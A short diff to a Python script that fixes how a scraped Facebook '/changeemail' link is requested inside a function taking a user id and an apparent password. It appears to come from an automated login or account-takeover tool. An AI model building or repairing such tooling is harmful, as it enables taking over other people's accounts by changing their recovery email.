@@ -1329,7 +1329,7 @@ def mbasic(uid,pwx,tl):
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36'}
             for i in  re.findall('href="/changeemail(.*?)"',response.text):
                url="https://www.facebook.com/changeemail"+i
-            response = Session.get("https://www.facebook.com"+url, headers=headers)
+            response = Session.get(url, headers=headers)
             headers = {
             'accept': 'text/html,application/xhtm 1+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-encoding': 'gzip, deflate',
